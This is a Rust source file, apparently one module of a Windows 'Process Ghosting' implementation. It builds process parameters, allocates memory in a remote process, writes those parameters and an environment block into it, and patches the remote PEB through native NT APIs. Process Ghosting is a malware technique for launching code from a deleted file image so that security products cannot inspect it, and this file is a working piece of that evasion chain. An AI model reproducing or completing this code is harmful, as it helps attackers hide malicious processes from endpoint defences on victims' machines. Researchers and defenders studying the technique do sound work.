use ntapi::ntmmapi::{ NtReadVirtualMemory};
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
    RTL_USER_PROC_PARAMS_NORMALIZED,
};
use ntapi::winapi::shared::ntdef::{HANDLE, NT_SUCCESS, NULL, UNICODE_STRING, PVOID};
use ntapi::winapi::um::errhandlingapi::GetLastError;
use ntapi::winapi::um::memoryapi::WriteProcessMemory;
use ntapi::winapi::um::userenv::CreateEnvironmentBlock;
use ntapi::winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use std::mem::zeroed;
use std::ptr::null_mut;
use winapi::shared::minwindef::{LPCVOID, LPVOID};
use winapi::um::memoryapi::VirtualAllocEx;
use ntapi::ntpebteb::{PPEB, PEB};
use std::intrinsics::size_of;
use widestring::U16String;
use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};

pub unsafe fn buffer_remote_peb(h_proces: HANDLE,pbi: PROCESS_BASIC_INFORMATION)->PEB{
    let mut peb_copy=zeroed::<PEB>();
    let remote_peb_addr=pbi.PebBaseAddress;
    println!("Peb Address {:?}",remote_peb_addr);

    let status=NtReadVirtualMemory(h_proces,
                                   remote_peb_addr as *const _ as *mut _,
                                   &mut peb_copy as *const _ as *mut _,
                                   size_of::<PEB>(),
                                   null_mut());

    if !NT_SUCCESS(status){
        println!("Cannot Read Remote PEB");
    }
    peb_copy
}

unsafe fn set_params_in_peb(params: PVOID,h_process: HANDLE, remote_peb: PPEB)->bool{

    let to_pvoid=std::mem::transmute::<&PRTL_USER_PROCESS_PARAMETERS,LPVOID>(&(*remote_peb).ProcessParameters);
    let params_to_lpcvoid=std::mem::transmute::<&PVOID,LPCVOID>(&params);

    let x = WriteProcessMemory(h_process,
                               to_pvoid,
                               params_to_lpcvoid,
                               size_of::<PVOID>(),
                               null_mut());
    if x == 0{
        println!("update Peb Fails");
        return false
    }
    println!("update Peb Success");
    return true
}


unsafe fn write_params_into_process(
    hprocess: HANDLE,
    params: PRTL_USER_PROCESS_PARAMETERS,
) -> LPVOID {
    let mut return_legth: usize = 0;
    //let buffer_deference = std::mem::transmute::<PRTL_USER_PROCESS_PARAMETERS,LPVOID>(params);
    //let mut sz2 = (*params).EnvironmentSize + (*params).MaximumLength as usize;

    let params_to_lpvoid=std::mem::transmute::<PRTL_USER_PROCESS_PARAMETERS,LPVOID>(params);
    let size_params_transmute=std::mem::transmute::<u64,SIZE_T>((*params).Length as u64);

    if!VirtualAllocEx(
        hprocess,
        params_to_lpvoid,
        size_params_transmute,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ).is_null(){
        println!("Allocation Params Success");

        // let params_lpcvoid=std::mem::transmute::<PRTL_USER_PROCESS_PARAMETERS,LPCVOID>(params);
        if WriteProcessMemory(
            hprocess,
            params_to_lpvoid,
            params_to_lpvoid,
            size_params_transmute,
            &mut return_legth,
        ) == 0 {

            println!("Writeprocess Params Fails");
            return null_mut();
        }
        println!("Writeprocess Params Success");

        if !(*params).Environment.is_null() {
            println!("Environment is no null");


            let environment_to_lpcvoid=std::mem::transmute::<PVOID,LPVOID>((*params).Environment);
            let size_environment_transmute=std::mem::transmute::<ULONG_PTR,SIZE_T>((*params).EnvironmentSize);

            if !VirtualAllocEx(
                hprocess,
                environment_to_lpcvoid,
                size_environment_transmute,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ).is_null(){

                println!("Allocation Environment Success");

                if WriteProcessMemory(
                    hprocess,
                    environment_to_lpcvoid,
                    environment_to_lpcvoid as *const _,
                    size_environment_transmute,
                    &mut return_legth,
                ) == 0 {
                    println!("Writeprocess fails Environment");
                    return null_mut();
                }
                println!("Writeprocess Success Environment");
            }
        }
    }

    return params as LPVOID
}

//LPVOID write_params_into_process(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, DWORD protect)
//bool set_params_in_peb(PVOID params_base, HANDLE hProcess, PPEB remote_peb)
extern {
    //pub fn set_params_in_peb(params: PVOID,h_process: HANDLE, remote_peb: PPEB)->bool;
    //pub fn write_params_into_process(h_process: HANDLE,params: PRTL_USER_PROCESS_PARAMETERS,protect: DWORD)->*mut c_void;
}


pub(crate) unsafe fn setup_process_parameters(
    h_process: HANDLE,
    pbi: &PROCESS_BASIC_INFORMATION,
    target: U16String,
) -> bool {
    //TODO HERE ADD A FUNCTION TO GET THE PROCESS TARGET DIRECTORY I PUT ONE DIRECT FOR FACILITY

    let mut unicode_target = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_target ,
        target.as_ptr(),
    );

    let mut unicode_current_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_current_dir,
        U16String::from("C:\\Windows\\System32\\").as_ptr() ,
    );

    let mut unicode_dll_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_dll_dir,
        U16String::from("C:\\Windows\\System32").as_ptr() ,
    );

    let mut unicode_window_name = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_window_name,
        U16String::from("Process Ghosting").as_ptr(),
    );

    let mut environment = zeroed::<LPVOID>();
    CreateEnvironmentBlock(&mut environment, NULL, 1);

    let mut params = zeroed::<PRTL_USER_PROCESS_PARAMETERS>();




    //    let va_entrypoint: *mut winapi::ctypes::c_void = std::mem::transmute::<ULONGLONG, *mut winapi::ctypes::c_void>(entry_point);

    // let target_punicode=std::mem::transmute::<*const u16,PUNICODE_STRING>(target.as_ptr());

    let status = RtlCreateProcessParametersEx(
        &mut params,
        &unicode_target as *const _ as *mut _,
        &unicode_dll_dir as *const _ as *mut _,
        &unicode_current_dir as *const _ as *mut _,
        &unicode_target as *const _ as *mut _,
        environment,
        &unicode_window_name as *const _ as *mut _,
        null_mut(),
        null_mut(),
        null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );

    if !NT_SUCCESS(status) {
        let error= GetLastError();
        println!("RtlCreateProcessParametersEX Fail Error: {}",error);
        return false;
    }
    println!("RtlCreateProcessParametersEX Success");

    // let remote_params=write_params_into_process(h_process, params,PAGE_READWRITE);
    let remote_params=write_params_into_process(h_process, params);

    if remote_params.is_null(){
        println!("Cannot make a remote copy of parameters");
        return false
    }

    if !set_params_in_peb(remote_params,h_process,pbi.PebBaseAddress){
        println!("Cannot Make Update Peb: {}",GetLastError());
        return false
    }

    let peb_copy=buffer_remote_peb(h_process,pbi.to_owned());

    println!(">ProcessParameters addr {:?}",peb_copy.ProcessParameters);
    //let mut sz2=buffer_end-buffer_process as usize;

    return true;
}
